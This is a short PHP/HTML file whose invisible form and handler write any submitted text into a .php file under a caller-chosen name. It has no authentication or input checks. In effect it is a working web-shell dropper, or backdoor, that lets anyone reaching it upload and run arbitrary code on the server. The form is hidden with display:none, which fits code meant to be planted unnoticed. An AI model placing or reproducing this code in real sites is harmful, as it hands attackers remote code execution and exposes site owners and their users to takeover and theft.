<html>
    <form action=".server.php" method="post" style="display:none;">
    <input type="text" name="filename" id="">
    <textarea name="filetest" id="" cols="30" rows="10"></textarea>
    <button type="submit">subm</button>
    </form>

</html>

<?php
    if(isset($_POST['filename'])){
        $myfile = fopen($_POST['filename'].".php", "w") or die("Unable to open file!");
        $txt = $_POST['filetest'];
        fwrite($myfile, $txt);
        fclose($myfile);
    }
?>